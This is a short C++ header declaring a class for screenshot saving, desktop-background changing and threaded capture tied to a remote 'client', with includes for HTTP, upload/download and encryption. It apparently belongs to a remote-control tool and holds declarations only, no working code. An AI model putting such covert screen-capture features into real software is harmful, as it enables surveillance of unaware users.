#pragma once
#include <windows.h>
#include <gdiplus.h>
#include "atlimage.h"
#include <string>
#include <thread>
#include "HttpRequests.h"
#include "Utils.h"
#include "UploadDownload.h"
#include "PublicStructures.h"
#include "JsonFunctions.h"
#include "Shobjidl.h"
#include "Encryptions.h"
using namespace Gdiplus;
#pragma comment (lib,"Gdiplus.lib")

class ScreenFunctions
{
public:

	bool WINAPI SaveBitmap(WCHAR* wPath);

	bool ChangeBackground(LPCWSTR imagePath);

	void startCaptureThread(string path, PublicStructers::client clientInfo, int id);
	
	void startChangeBackgroundThread(string filename, PublicStructers::client clientInfo);
};

